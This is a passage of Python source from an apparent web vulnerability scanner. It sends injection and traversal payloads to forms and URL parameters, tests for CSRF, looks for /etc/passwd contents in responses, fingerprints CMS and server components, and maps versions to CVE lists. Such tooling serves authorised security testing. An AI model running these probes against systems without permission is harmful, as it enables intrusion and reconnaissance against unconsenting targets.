            context = 'Node.js'
        elif 'python' in x_powered or 'django' in x_powered:
            context = 'Python'
        elif 'java' in server or 'tomcat' in server:
            context = 'Java'

        # Get payloads and extend with context-aware
        payloads = list(self.active_payloads.get(name, []))
        if context in self.context_payloads:
            payloads.extend(self.context_payloads[context])

        if name in ["Server-Side Template Injection (SSTI)", "XSS", "SQL Injection", "Command Injection", "Remote Code Execution", "Local File Inclusion", "Remote File Inclusion", "JWT Vulnerabilities", "Deserialization", "Open Redirect"]:
            matches.extend(self._test_post_forms(normalized_target, soup, payloads, name))
            matches.extend(self._test_get_params(normalized_target, payloads, name, discovered_params))

        elif name == "Cross-Site Request Forgery (CSRF)":
            forms = soup.find_all('form')
            for form in forms[:2]:
                if form.get('method', '').lower() == 'post':
                    action = form.get('action') or ''
                    if not action.startswith(('http://', 'https://')):
                        action = urljoin(normalized_target, action)
                    inputs = {
                        inp.get('name'): "test"
                        for inp in form.find_all('input')
                        if inp.get('name') and inp.get('type') != 'hidden'
                    }
                    try:
                        time.sleep(self.request_delay)
                        response = requests.post(action, data=inputs, timeout=5, proxies=proxies, verify=self.verify_ssl)
                        self._inc_requests()
                        logger.debug("Active CSRF test: POST %s with %s, Response: %s", action, inputs, response.text[:200])
                        if response.status_code in [200, 201, 302] and "error" not in response.text.lower():
                            poc = self._build_poc("POST", action, "test", list(inputs.keys())[0] if inputs else "", f"HTTP {response.status_code} success without CSRF token")
                            matches.append((response.text[:120], f"Active CSRF test: Form submission succeeded without token", 0.9, "Active", poc))
                    except requests.RequestException as e:
                        logger.debug("Active CSRF test failed: %s", e)
                        pass

        elif name == "Directory Traversal":
            params = ["path", "file", "dir", "resource"]
            for payload in self.active_payloads[name]:
                for param in params:
                    test_url = f"{normalized_target}?{param}={payload}"
                    try:
                        time.sleep(self.request_delay)
                        response = requests.get(test_url, timeout=5, proxies=proxies, verify=self.verify_ssl)
                        self._inc_requests()
                        response_text = response.text.lower()
                        logger.debug("Active Directory Traversal test: GET %s, Response: %s", test_url, response.text[:200])
                        if self.is_waf_response(response_text):
                            with self.waf_lock:
                                self.waf_block_counts[name] = self.waf_block_counts.get(name, 0) + 1
                            logger.debug("WAF blocked Directory Traversal test: %s", test_url)
                            continue
                        if (
                            any(keyword in response_text for keyword in ["root:x:0:0", "bin/bash", "shadow", "<?php"])
                            and re.search(r"^[a-z0-9_]+:x:[0-9]+:[0-9]+:", response.text, re.MULTILINE)
                            and not response.text.strip().startswith("<!DOCTYPE html")
                            and not "<html" in response_text[:100]
                        ) or (
                            "hosts" in response_text and "127.0.0.1" in response_text
                        ):
                            poc = self._build_poc("GET", test_url, payload, param, "passwd/hosts file content in response")
                            matches.append((
                                response.text[:120],
                                f"Active Directory Traversal test: {param}={payload} exposed sensitive file",
                                0.9,
                                "Active",
                                poc
                            ))
                    except requests.RequestException as e:
                        logger.debug("Active Directory Traversal test failed for %s: %s", name, e)
                        pass





        return matches

    def check_vulnerability(self, args) -> Tuple[str, str, List[Tuple[str, str, float, str]], str, str]:
        """Check a single vulnerability with passive and active scanning."""
        if len(args) == 7:
            name, vuln_data, content, soup, target, headers, discovered_params = args
        else:
            name, vuln_data, content, soup, target, headers = args
            discovered_params = None
        if not headers:
            headers = {}
        conf = self.confidence_scores.get(name, 0.5)
        detected_by = vuln_data.get('detected_by', 'heuristic')
        severity = vuln_data.get('severity', 'medium')
        pattern = vuln_data.get('pattern')
        if not isinstance(pattern, str) or not pattern:
            logger.warning("Invalid pattern for vulnerability %s, skipping", name)
            return (name, Fore.YELLOW + "No pattern" + Style.RESET_ALL, [], detected_by, severity)
        try:
            compiled_pattern = re.compile(pattern, re.IGNORECASE)
            matches = []
            csp_present = headers.get('Content-Security-Policy', '').lower() != ''
            
            if name == 'Cross-Site Request Forgery (CSRF)':
                for form in soup.find_all('form'):
                    form_str = str(form)
                    if compiled_pattern.search(form_str):
                        token_pattern = r'<input[^>]*type=["\']hidden["\'][^>]*name=["\'](?:authenticity_token|_csrf|csrf_token)["\'][^>]*>'
                        has_token = bool(re.search(token_pattern, form_str, re.IGNORECASE))
                        if not has_token:
                            match = form_str if len(form_str) <= 200 else form_str[:197] + "..."
                            matches.append((form_str[:120], match, conf, "Passive"))
            elif name == 'Directory Traversal':
                matches = [
                    (content[max(0, match.start() - 10):match.end() + 10], match.group(0), conf, "Passive")
                    for match in compiled_pattern.finditer(content)
                    if not any(attr in content[max(0, match.start() - 20):match.start()].lower() for attr in ['href="', 'href=\'', 'src="', 'src=\'', 'value="', 'value=\''])
                ]
            elif name == 'Cross-Domain Scripting':
                matches = [
                    (content[max(0, match.start() - 10):match.end() + 10], match.group(0), conf, "Passive")
                    for match in compiled_pattern.finditer(content)
                    if not any(domain in match.group(0).lower() for domain in self.trusted_domains)
                    and not match.group(0).startswith(('<script src="/', '<script src="//'))
                    and re.match(r'<script\s+src=["\'][^\'"]*["\']\s*>', match.group(0))
                    and '://' in match.group(0)
                ]
            elif name == 'Cross-Site Script Inclusion (CSSI)':
                matches = [
                    (content[max(0, match.start() - 10):match.end() + 10], match.group(0), conf, "Passive")
                    for match in compiled_pattern.finditer(content)
                    if not any(domain in match.group(0).lower() for domain in self.trusted_domains)
                    and '://' in match.group(0)
                ]
            elif name == 'XSS':
                xss_patterns = [
                    r'<script\s*>.*?\b(document\.write|eval|setTimeout|setInterval)\s*\(.*?<\\/script>',
                    r'<[^>]+(on(?:click|load|mouseover|submit|error|focus|blur|change|input|keydown|keypress|keyup|mousedown|mousemove|mouseout|mouseup))=[\'"].*?[\'"]',
                    r'<script\s*>.*?[\'"]javascript:[^\'"]*[\'"].*?</script>',
                    r'<script\s*>.*?[<"][^>]*?alert\([^>]*?\)[^<]*?[<"].*?</script>'
                ]
                for xss_pattern in xss_patterns:
                    compiled_xss = re.compile(xss_pattern, re.IGNORECASE)
                    for match in compiled_xss.finditer(content):
                        if 'on' in match.group(0) and not any(keyword in match.group(0).lower() for keyword in ['javascript:', 'eval(', 'alert(', 'document.', 'window.', 'location.']):
                            continue
                        # Exclude safe event handlers
                        if 'onclick' in match.group(0).lower() and any(safe in match.group(0).lower() for safe in ['window.', 'showpage(', 'scrollto(', 'toggle', 'hide', 'show', 'open', 'close']):
                            continue
                        if (
                            not match.group(0).startswith(('<meta', '<noscript', '<div'))
                            and not any(domain in match.group(0).lower() for domain in self.trusted_domains)
                            and not match.group(0).startswith(('<script src="/', '<script src="./', '<script src="../'))
                            and 'w-script' not in match.group(0).lower()
                            and 'nonce=' not in match.group(0).lower()
                        ):
                            confidence = conf * (0.5 if csp_present else 1.0)
                            matches.append((
                                content[max(0, match.start() - 10):match.end() + 10],
                                match.group(0),
                                confidence,
                                "Passive"
                            ))

            else:
                matches = [
                    (content[max(0, match.start() - 10):match.end() + 10], match.group(0), conf, "Passive")
                    for match in compiled_pattern.finditer(content)
                ]

            if name == 'HTML Injection':
                matches = [m for m in matches if not ('onclick' in m[1].lower() and any(safe in m[1].lower() for safe in ['window.', 'showpage(', 'scrollto(', 'toggle', 'hide', 'show', 'open', 'close']))]
            elif name == 'HTTP Response Splitting':
                matches = [m for m in matches if '\r\n' in m[1] or '%0d%0a' in m[1].lower() or '%0d' in m[1].lower()]

            matches = [
                m for m in matches
                if (len(m[1]) >= 5 or m[1] in ['exec(', 'system(']) and not m[1].isspace()
            ][:50]

            if name in self.active_payloads:
                if not self.passive:
                    active_matches = self.active_scan(target, soup, name, headers, discovered_params)
                else:
                    active_matches = []
            else:
                active_matches = []

            matches.extend(active_matches)

            status = Fore.GREEN + "Vulnerable" + Style.RESET_ALL if matches else Fore.RED + "Not Vulnerable" + Style.RESET_ALL
            if not matches and self.waf_block_counts.get(name, 0) > 0:
                status = Fore.YELLOW + "Inconclusive (WAF interference)" + Style.RESET_ALL
            if active_matches:
                detected_by = 'active'
            return (name, status, matches, detected_by, severity)
        except re.error as e:
            logger.warning("Invalid regex pattern for %s: %s", name, e)
            return (name, Fore.YELLOW + "Error in pattern" + Style.RESET_ALL, [], 'heuristic', severity)

    def check_vulnerabilities(self, pages: List[Tuple[str, int, str, Dict]]) -> List[Tuple[str, str, List[Tuple[str, str, float, str]], str, str]]:
        """Check vulnerabilities across multiple pages."""
        self.waf_block_counts.clear()
        agg = OrderedDict()
        discovered_params = self._extract_params_from_pages(pages)
        if discovered_params:
            logger.info("Discovered %d parameters from crawled pages: %s", len(discovered_params), ", ".join(sorted(discovered_params)[:10]))

        if not self._detected_cms and pages:
            first_content = pages[0][2].lower()
            first_gen = ''
            gen_soup = BeautifulSoup(pages[0][2], 'html.parser', parse_only=SoupStrainer('meta'))
            gen_meta = gen_soup.find('meta', {'name': 'generator'})
            if gen_meta:
                first_gen = gen_meta.get('content', '')
            if 'MediaWiki' in first_gen or 'mediawiki' in first_content:
                self._detected_cms = 'MediaWiki'
            elif 'wp-content' in first_content or 'wordpress' in first_content:
                self._detected_cms = 'WordPress'
            elif 'joomla' in first_content:
                self._detected_cms = 'Joomla'
            elif 'drupal' in first_content:
                self._detected_cms = 'Drupal'
            if self._detected_cms:
                logger.info("Detected CMS: %s", self._detected_cms)

        for url, status_code, content, headers in pages:
            if status_code != 200:
                continue
            logger.debug("Scanning page: %s", url)
            soup = BeautifulSoup(content, 'html.parser', parse_only=SoupStrainer(['script', 'style', 'form', 'link']))

            content_cleaned = content
            if soup.find(['script', 'style']):
                for tag in soup(['script', 'style']):
                    tag.decompose()
                content_cleaned = str(soup)

            with ThreadPoolExecutor() as executor:
                tasks = [
                    (name, vuln_data, content if name in ['XSS', 'Cross-Site Script Inclusion (CSSI)', 'Cross-Domain Scripting', 'Cross-Site Request Forgery (CSRF)', 'Directory Traversal'] else content_cleaned, soup, url, headers, discovered_params)
                    for name, vuln_data in self.vulnerabilities.items()
                ]
                try:
                    results = list(executor.map(self.check_vulnerability, tasks))
                except RuntimeError as e:
                    if "Max requests exceeded" in str(e):
                        logger.warning("Max requests exceeded during vulnerability checks")
                        break
                    else:
                        raise

            for name, status, matches, detected_by, severity in results:
                if name not in agg:
                    agg[name] = [status, {}, detected_by, severity]
                if matches:
                    agg[name][0] = status
                    for match in matches:
                        key = (match[1], match[3] if len(match) > 3 else "Passive")
                        poc = match[4] if len(match) > 4 else None
                        if key not in agg[name][1]:
                            agg[name][1][key] = (match[0], match[1], match[2], match[3] if len(match) > 3 else "Passive", 1, poc)
                        else:
                            existing = agg[name][1][key]
                            new_poc = poc if poc else existing[5]
                            if match[2] > existing[2]:
                                agg[name][1][key] = (match[0], match[1], match[2], existing[3], existing[4] + 1, new_poc)
                            else:
                                agg[name][1][key] = (existing[0], existing[1], existing[2], existing[3], existing[4] + 1, new_poc)
                    agg[name][2] = detected_by
                    agg[name][3] = severity

        for vuln, count in self.waf_block_counts.items():
            logger.warning("WAF blocked %d %s test(s) across all pages", count, vuln)

        return [
            (name, status, list(matches.values()), detected_by, severity)
            for name, (status, matches, detected_by, severity) in agg.items()
        ]

    def _probe_server_stack(self, target: str, content: str, headers: Dict[str, str]) -> Dict[str, Any]:
        """Probe for PHP version, database, ICU version, Pygments via headers, API, and Special:Version."""
        stack = {
            'php_version': None,
            'db_type': None,
            'db_version': None,
            'icu_version': None,
            'pygments_version': None,
            'lua_version': None,
            'python_version': None,
            'component_cves': [],
        }

        xpb = headers.get('X-Powered-By', '')
        php_match = re.search(r'PHP[/ ]?(\d+\.\d+\.\d+)', xpb, re.IGNORECASE)
        if php_match:
            stack['php_version'] = php_match.group(1)

        if not php_match:
            php_match = re.search(r'PHP[/ ]?(\d+\.\d+\.\d+)', content)
            if php_match:
                stack['php_version'] = php_match.group(1)

        is_mediawiki = self._detected_cms == 'MediaWiki' or 'mediawiki' in content.lower()

        if is_mediawiki:
            api_paths = ['/w/api.php', '/api.php', '/wiki/api.php']
            for api_path in api_paths:
                api_url = urljoin(target, api_path) + '?action=query&meta=siteinfo&siprop=general|extensions&format=json'
                try:
                    time.sleep(self.request_delay)
                    resp = self.session.get(api_url, timeout=8, verify=self.verify_ssl)
                    self._inc_requests()
                    if resp.status_code == 200 and 'query' in resp.text:
                        data = resp.json()
                        general = data.get('query', {}).get('general', {})

                        if not stack['php_version']:
                            php_v = general.get('phpversion')
                            if php_v:
                                stack['php_version'] = php_v

                        db_type = general.get('dbtype', '')
                        db_version = general.get('dbversion', '')
                        if db_type:
                            stack['db_type'] = db_type
                        if db_version:
                            stack['db_version'] = db_version

                        icu_v = general.get('icu-unicode-version') or general.get('icu-version')
                        if not icu_v:
                            icu_v = general.get('icuversion')
                        if icu_v:
                            stack['icu_version'] = icu_v

                        extensions = data.get('query', {}).get('extensions', [])
                        for ext in extensions:
                            ext_name = ext.get('name', '').lower()
                            if 'pygments' in ext_name or 'syntaxhighlight' in ext_name:
                                ext_ver = ext.get('version')
                                if ext_ver:
                                    stack['pygments_version'] = ext_ver

                        break
                except Exception as e:
                    logger.debug("API probe failed for %s: %s", api_path, e)

            version_paths = ['/wiki/Special:Version', '/w/index.php?title=Special:Version', '/Special:Version']
            for vp in version_paths:
                try:
                    version_url = urljoin(target, vp)
                    time.sleep(self.request_delay)
                    resp = self.session.get(version_url, timeout=8, verify=self.verify_ssl)
                    self._inc_requests()
                    if resp.status_code == 200 and 'PHP' in resp.text:
                        vtext = resp.text

                        if not stack['php_version']:
                            m = re.search(r'PHP</a>\s*(\d+\.\d+\.\d+)', vtext) or re.search(r'PHP\s+(\d+\.\d+\.\d+)', vtext)
                            if m:
                                stack['php_version'] = m.group(1)

                        if not stack['db_type']:
                            m = re.search(r'(?:Database|Datenbank|Base de datos)[^<]*?:\s*(\w+)\s+([\d.]+)', vtext, re.IGNORECASE)
                            if m:
                                stack['db_type'] = m.group(1)
                                stack['db_version'] = m.group(2)
                            else:
                                for db in ['MySQL', 'MariaDB', 'PostgreSQL', 'SQLite']:
                                    m = re.search(rf'{db}\s+([\d.]+)', vtext)
                                    if m:
                                        stack['db_type'] = db
                                        stack['db_version'] = m.group(1)
                                        break

                        if not stack['icu_version']:
                            m = re.search(r'ICU\s+([\d.]+)', vtext)
                            if m:
                                stack['icu_version'] = m.group(1)

                        if not stack['pygments_version']:
                            m = re.search(r'[Pp]ygments\s+[Vv]?(?:ersion\s+)?([\d.]+)', vtext)
                            if m:
                                stack['pygments_version'] = m.group(1)

                        if not stack['lua_version']:
                            m = re.search(r'Lua\s+([\d.]+)', vtext)
                            if m:
                                stack['lua_version'] = m.group(1)

                        if not stack['python_version']:
                            m = re.search(r'Python\s+([\d.]+)', vtext)
                            if m:
                                stack['python_version'] = m.group(1)

                        break
                except Exception as e:
                    logger.debug("Special:Version probe failed for %s: %s", vp, e)

        return stack

    def _map_component_cves(self, stack: Dict[str, Any]):
        """Map detected component versions to known, version-specific CVEs with exploitability context.

        Each CVE entry includes:
          - severity: critical / high / medium / low
          - exploitability: how reachable the issue is in a typical web deployment
              remote-unauth    = exploitable by any web visitor
              remote-auth      = requires authenticated session
              local-only       = requires shell / DB / admin access
              config-dependent = only if specific feature / extension is enabled
          - fixed_in: version where the fix landed (for actionable guidance)
        """
        cves = stack['component_cves']

        def _v(version_str):
            try:
                return tuple(int(x) for x in version_str.split('.'))
            except (ValueError, AttributeError):
                return ()

        comp = lambda name, ver: f"{name} {ver}"

        # ── PHP ──────────────────────────────────────────────────────────
        if stack['php_version']:
            pv = _v(stack['php_version'])
            php_c = comp('PHP', stack['php_version'])
            if pv:
                if pv[:2] <= (8, 0):
                    cves.append({'component': php_c, 'cve': 'EOL', 'severity': 'critical', 'exploitability': 'remote-unauth',
                                 'description': 'PHP 8.0 and below are end-of-life — no security patches issued', 'fixed_in': 'Upgrade to 8.1+'})
                # Branch-specific CVEs — only flag if the detected branch is actually affected
                if pv[:2] == (8, 4) and pv < (8, 4, 21):
                    cves.append({'component': php_c, 'cve': 'CVE-2025-14179', 'severity': 'high', 'exploitability': 'config-dependent',
                                 'description': 'PDO Firebird SQL injection via NUL-byte truncation', 'fixed_in': '8.4.21'})
                if pv[:2] == (8, 3) and pv < (8, 3, 21):
                    cves.append({'component': php_c, 'cve': 'CVE-2025-14179', 'severity': 'high', 'exploitability': 'config-dependent',
                                 'description': 'PDO Firebird SQL injection via NUL-byte truncation', 'fixed_in': '8.3.21'})
                if pv[:2] == (8, 2) and pv < (8, 2, 28):
                    cves.append({'component': php_c, 'cve': 'CVE-2024-11235', 'severity': 'critical', 'exploitability': 'remote-unauth',
                                 'description': 'Request smuggling via stream HTTP wrapper', 'fixed_in': '8.2.28'})
                if pv[:2] == (8, 1) and pv < (8, 1, 32):
                    cves.append({'component': php_c, 'cve': 'CVE-2024-11235', 'severity': 'critical', 'exploitability': 'remote-unauth',
                                 'description': 'Request smuggling via stream HTTP wrapper', 'fixed_in': '8.1.32'})
                if pv[:2] == (8, 1) and pv < (8, 1, 30):
                    cves.append({'component': php_c, 'cve': 'CVE-2024-8926', 'severity': 'critical', 'exploitability': 'config-dependent',
                                 'description': 'CGI parameter injection (Windows CGI mode only)', 'fixed_in': '8.1.30'})
                if pv[:2] == (8, 3) and pv < (8, 3, 14):
                    cves.append({'component': php_c, 'cve': 'CVE-2024-9026', 'severity': 'medium', 'exploitability': 'local-only',
                                 'description': 'PHP-FPM log manipulation — requires local log access', 'fixed_in': '8.3.14'})

        # ── MediaWiki ────────────────────────────────────────────────────
        mw_version = stack.get('_mediawiki_version')
        if mw_version:
            mv = _v(mw_version)
            mw_c = comp('MediaWiki', mw_version)
            if mv:
                if mv[:2] == (1, 39):
                    if mv < (1, 39, 15):
                        cves.append({'component': mw_c, 'cve': 'CVE-2025-11261', 'severity': 'high', 'exploitability': 'remote-unauth',
                                     'description': 'XSS in mediawiki.Language.Js i18n handling', 'fixed_in': '1.39.15'})
                    if mv < (1, 39, 14):
                        cves.append({'component': mw_c, 'cve': 'CVE-2025-67479', 'severity': 'high', 'exploitability': 'remote-auth',
                                     'description': 'Parser sanitization flaw — potential RCE chain via Cite extension', 'fixed_in': '1.39.14'})
                        cves.append({'component': mw_c, 'cve': 'CVE-2025-61646', 'severity': 'high', 'exploitability': 'remote-auth',
                                     'description': 'EnhancedChangesList logic flaw — directory traversal / RCE-like impact', 'fixed_in': '1.39.14'})
                        cves.append({'component': mw_c, 'cve': 'CVE-2025-61644', 'severity': 'medium', 'exploitability': 'remote-auth',
                                     'description': 'Watchlist JS widget XSS', 'fixed_in': '1.39.14'})
                    if mv < (1, 39, 12):
                        cves.append({'component': mw_c, 'cve': 'CVE-2025-32072', 'severity': 'medium', 'exploitability': 'remote-unauth',
                                     'description': 'Output escaping issue in feed generation', 'fixed_in': '1.39.12'})
                    if mv < (1, 39, 5):
                        cves.append({'component': mw_c, 'cve': 'CVE-2023-45360', 'severity': 'medium', 'exploitability': 'remote-auth',
                                     'description': 'Stored XSS via i18n messages', 'fixed_in': '1.39.5'})
                        cves.append({'component': mw_c, 'cve': 'CVE-2023-45362', 'severity': 'medium', 'exploitability': 'remote-auth',
                                     'description': 'Information leak in diff engine', 'fixed_in': '1.39.5'})
                if mv[:2] < (1, 39):
                    cves.append({'component': mw_c, 'cve': 'EOL', 'severity': 'critical', 'exploitability': 'remote-unauth',
                                 'description': 'MediaWiki branch is end-of-life — no security patches', 'fixed_in': 'Upgrade to 1.39 LTS or 1.42+'})

        # ── MariaDB ──────────────────────────────────────────────────────
        if stack['db_type'] and stack['db_version']:
            db = stack['db_type'].lower()
            dv = _v(stack['db_version'])
            if dv:
                if 'mariadb' in db:
                    db_c = comp('MariaDB', stack['db_version'])
                    if dv[:2] <= (10, 4):
                        cves.append({'component': db_c, 'cve': 'EOL', 'severity': 'high', 'exploitability': 'local-only',
                                     'description': 'MariaDB 10.4 and below are end-of-life', 'fixed_in': 'Upgrade to 10.5+ or 11.x'})
                    if dv < (10, 5, 27) and dv[:2] == (10, 5):
                        cves.append({'component': db_c, 'cve': 'CVE-2023-22084', 'severity': 'medium', 'exploitability': 'local-only',
                                     'description': 'Optimizer DoS — requires authenticated DB session', 'fixed_in': '10.5.27'})
                    if dv < (10, 6, 16) and dv[:2] == (10, 6):
                        cves.append({'component': db_c, 'cve': 'CVE-2024-21096', 'severity': 'medium', 'exploitability': 'local-only',
                                     'description': 'mysqldump improper validation — requires local tool access', 'fixed_in': '10.6.16'})
                    # MariaDB 11.x / 12.x — no widely confirmed unpatched CVEs for default configs
                    if dv[0] >= 11:
                        cves.append({'component': db_c, 'cve': 'INFO', 'severity': 'info', 'exploitability': 'local-only',
                                     'description': 'No widely confirmed unpatched CVEs for this version in default configurations. DB typically localhost-only — low remote attack surface.', 'fixed_in': 'N/A'})

                elif 'mysql' in db:
                    db_c = comp('MySQL', stack['db_version'])
                    if dv[:2] < (8, 0):
                        cves.append({'component': db_c, 'cve': 'EOL', 'severity': 'critical', 'exploitability': 'local-only',
                                     'description': 'MySQL 5.x is end-of-life — no security patches', 'fixed_in': 'Upgrade to 8.0+'})
                    if dv[:2] == (8, 0) and dv < (8, 0, 36):
                        cves.append({'component': db_c, 'cve': 'CVE-2024-20960', 'severity': 'medium', 'exploitability': 'local-only',
                                     'description': 'Server optimizer DoS — requires authenticated DB session', 'fixed_in': '8.0.36'})

                elif 'postgres' in db:
                    db_c = comp('PostgreSQL', stack['db_version'])
                    if dv[0] < 13:
                        cves.append({'component': db_c, 'cve': 'EOL', 'severity': 'high', 'exploitability': 'local-only',
                                     'description': 'PostgreSQL version is end-of-life', 'fixed_in': 'Upgrade to 13+'})
                    if dv < (16, 2) and dv[0] == 16:
                        cves.append({'component': db_c, 'cve': 'CVE-2024-0985', 'severity': 'high', 'exploitability': 'local-only',
                                     'description': 'REFRESH MATERIALIZED VIEW CONCURRENTLY privilege escalation — requires DB auth', 'fixed_in': '16.2'})

                elif 'sqlite' in db:
                    db_c = comp('SQLite', stack['db_version'])
                    if dv < (3, 43, 2):
                        cves.append({'component': db_c, 'cve': 'CVE-2023-7104', 'severity': 'high', 'exploitability': 'config-dependent',
                                     'description': 'Heap buffer overflow in sessions extension — requires sessions extension enabled', 'fixed_in': '3.43.2'})

        # ── ICU ──────────────────────────────────────────────────────────
        if stack['icu_version']:
            iv = _v(stack['icu_version'])
            icu_c = comp('ICU', stack['icu_version'])
            if iv:
                if iv < (72,):
                    cves.append({'component': icu_c, 'cve': 'CVE-2023-4004', 'severity': 'high', 'exploitability': 'config-dependent',
                                 'description': 'OOB write in certain locale operations — requires specific locale processing paths', 'fixed_in': '72'})
                if iv >= (74,):
                    cves.append({'component': icu_c, 'cve': 'INFO', 'severity': 'info', 'exploitability': 'N/A',
                                 'description': 'No major CVEs tied to this ICU version. ICU vulns typically affect older 60-70 range.', 'fixed_in': 'N/A'})
                elif iv >= (72,):
                    cves.append({'component': icu_c, 'cve': 'Advisory', 'severity': 'low', 'exploitability': 'config-dependent',
                                 'description': 'ICU versions below 74 may lack some security hardening — low practical risk in web context', 'fixed_in': '74'})

        # ── Pygments ─────────────────────────────────────────────────────
        if stack['pygments_version']:
            pgv = _v(stack['pygments_version'])
            pg_c = comp('Pygments', stack['pygments_version'])
            if pgv:
                if pgv < (2, 7, 4):
                    cves.append({'component': pg_c, 'cve': 'CVE-2021-20270', 'severity': 'medium', 'exploitability': 'config-dependent',
                                 'description': 'Infinite loop in SML lexer — requires SML code highlighting by untrusted input', 'fixed_in': '2.7.4'})
                if pgv < (2, 11, 0):
                    cves.append({'component': pg_c, 'cve': 'CVE-2022-40896', 'severity': 'medium', 'exploitability': 'config-dependent',
                                 'description': 'ReDoS in SQL lexers — requires SQL syntax highlighting of untrusted input', 'fixed_in': '2.11.0'})
                if pgv < (2, 15, 0):
                    cves.append({'component': pg_c, 'cve': 'CVE-2023-46216', 'severity': 'medium', 'exploitability': 'config-dependent',
                                 'description': 'ReDoS in multiple lexers — exploitable if untrusted code is highlighted', 'fixed_in': '2.15.0'})
                if pgv >= (2, 15, 0):
                    cves.append({'component': pg_c, 'cve': 'INFO', 'severity': 'info', 'exploitability': 'N/A',
                                 'description': 'No known CVEs. Pygments is not network-exposed in typical MediaWiki installs.', 'fixed_in': 'N/A'})

        # ── Lua ──────────────────────────────────────────────────────────
        if stack.get('lua_version'):
            lv = _v(stack['lua_version'])
            lua_c = comp('Lua', stack['lua_version'])
            if lv:
                if lv < (5, 4, 4):
                    cves.append({'component': lua_c, 'cve': 'CVE-2022-33099', 'severity': 'medium', 'exploitability': 'config-dependent',
                                 'description': 'Heap buffer overflow via crafted script — requires Scribunto/Lua module execution of untrusted input', 'fixed_in': '5.4.4'})
                else:
                    cves.append({'component': lua_c, 'cve': 'INFO', 'severity': 'info', 'exploitability': 'N/A',
                                 'description': 'No known CVEs for this Lua version in sandboxed MediaWiki (Scribunto) context.', 'fixed_in': 'N/A'})

    def fingerprint(self, content: str, headers: Dict[str, str], target: str) -> Dict[str, Any]:
        """Generate a structured fingerprint of the target."""
        fingerprint = {
            'server': headers.get('Server', 'Unknown'),
            'x_powered_by': headers.get('X-Powered-By', 'Unknown'),
            'os_guess': 'Unknown',
            'programming_languages': [],
            'generator': None,
            'cms_guess': 'Unknown',
            'mediawiki_version': None,
            'wordpress_version': None,
            'joomla_version': None,
            'drupal_version': None,
            'known_vulns': [],
            'extension_vulns': [],
            'frontend_frameworks': [],
            'backend_frameworks': [],
            'cdn_services': [],
            'ecommerce_platforms': [],
            'analytics_tracking': [],
            'security_waf': [],
            'security_headers': {},
            'robots_txt': 'Unknown',
            'sitemap_xml': 'Unknown',
            'ssl_enabled': False,
            'miscellaneous': [],
            'hardening_tips': [],
            'server_stack': {},
        }
        
        server_lower = fingerprint['server'].lower()
        if 'ubuntu' in server_lower or 'debian' in server_lower:
            fingerprint['os_guess'] = 'Linux (Ubuntu/Debian)'
        elif 'centos' in server_lower or 'red hat' in server_lower:
            fingerprint['os_guess'] = 'Linux (CentOS/Red Hat)'
        elif 'windows' in server_lower:
            fingerprint['os_guess'] = 'Windows'
        elif 'nginx' in server_lower or 'apache' in server_lower:
            fingerprint['os_guess'] = 'Linux (likely)'
        elif 'iis' in server_lower:
            fingerprint['os_guess'] = 'Windows'
        elif 'tomcat' in server_lower:
            fingerprint['os_guess'] = 'Linux/Unix (Java)'
        elif 'php' in fingerprint['x_powered_by'].lower():
            fingerprint['os_guess'] = 'Linux (PHP)'
        elif 'asp.net' in server_lower or 'asp.net' in fingerprint['x_powered_by'].lower():
            fingerprint['os_guess'] = 'Windows (ASP.NET)'
        
        # Programming Languages
        x_powered_lower = fingerprint['x_powered_by'].lower()
        if 'php' in x_powered_lower or 'php' in server_lower:
            fingerprint['programming_languages'].append('PHP')
        if 'asp.net' in server_lower or 'asp.net' in x_powered_lower:
            fingerprint['programming_languages'].append('ASP.NET')
        if 'python' in server_lower or 'python' in x_powered_lower or 'django' in x_powered_lower:
            fingerprint['programming_languages'].append('Python')
        if 'ruby' in server_lower or 'ruby' in x_powered_lower:
            fingerprint['programming_languages'].append('Ruby')
        if 'node' in server_lower or 'node.js' in x_powered_lower:
            fingerprint['programming_languages'].append('Node.js')
        if 'java' in server_lower or 'java' in x_powered_lower or 'tomcat' in server_lower:
            fingerprint['programming_languages'].append('Java')
        if 'go' in server_lower or 'go' in x_powered_lower:
            fingerprint['programming_languages'].append('Go')
        if 'rust' in server_lower or 'rust' in x_powered_lower:
            fingerprint['programming_languages'].append('Rust')
        
        soup = BeautifulSoup(content, 'html.parser')
        generator_meta = soup.find('meta', {'name': 'generator'})
        if generator_meta:
            fingerprint['generator'] = generator_meta.get('content', 'Unknown')
        
        content_lower = content.lower()
        if 'wp-content' in content_lower or 'wordpress' in content_lower:
            fingerprint['cms_guess'] = 'WordPress'
            # WordPress version detection
            wp_version_match = re.search(r'wp-embed\.min\.js\?ver=(\d+\.\d+\.\d+)', content_lower) or \
                              re.search(r'version (\d+\.\d+\.\d+)', (fingerprint.get('generator') or '').lower()) or \
                              re.search(r'WordPress (\d+\.\d+\.\d+)', content_lower) or \
                              re.search(r'wp-includes/js/wp-embed\.min\.js\?ver=(\d+\.\d+\.\d+)', content_lower)
            if wp_version_match:
                wp_version = wp_version_match.group(1)
                fingerprint['wordpress_version'] = wp_version
                # Add known vulns for WordPress
                v_parts = list(map(int, wp_version.split('.')))
                if v_parts[0] < 6:
                    fingerprint['known_vulns'].append({'description': 'WordPress version is outdated, potential security risks', 'detected_by': 'version'})
        elif 'joomla' in content_lower:
            fingerprint['cms_guess'] = 'Joomla'
            # Joomla version detection
            joomla_version_match = re.search(r'Joomla! (\d+\.\d+)', content_lower) or \
                                  re.search(r'joomla (\d+\.\d+)', (fingerprint.get('generator') or '').lower())
            if joomla_version_match:
                fingerprint['joomla_version'] = joomla_version_match.group(1)
        elif 'drupal' in content_lower:
            fingerprint['cms_guess'] = 'Drupal'
            # Drupal version detection
            drupal_version_match = re.search(r'Drupal (\d+)', content_lower) or \
                                  re.search(r'drupal (\d+)', (fingerprint.get('generator') or '').lower())
            if drupal_version_match:
                fingerprint['drupal_version'] = drupal_version_match.group(1)
        elif 'magento' in content_lower:
            fingerprint['cms_guess'] = 'Magento'
        elif 'shopify' in content_lower:
            fingerprint['cms_guess'] = 'Shopify'
        elif 'wix' in content_lower:
            fingerprint['cms_guess'] = 'Wix'
        elif 'squarespace' in content_lower:
            fingerprint['cms_guess'] = 'Squarespace'
        elif 'ghost' in content_lower:
            fingerprint['cms_guess'] = 'Ghost'
        elif 'typo3' in content_lower:
            fingerprint['cms_guess'] = 'TYPO3'
        elif 'blogger' in content_lower:
            fingerprint['cms_guess'] = 'Blogger'
        elif 'umbraco' in content_lower:
            fingerprint['cms_guess'] = 'Umbraco'
        elif 'concrete5' in content_lower:
            fingerprint['cms_guess'] = 'Concrete5'
        elif 'mediawiki' in content_lower:
            fingerprint['cms_guess'] = 'MediaWiki'
        elif 'silverstripe' in content_lower:
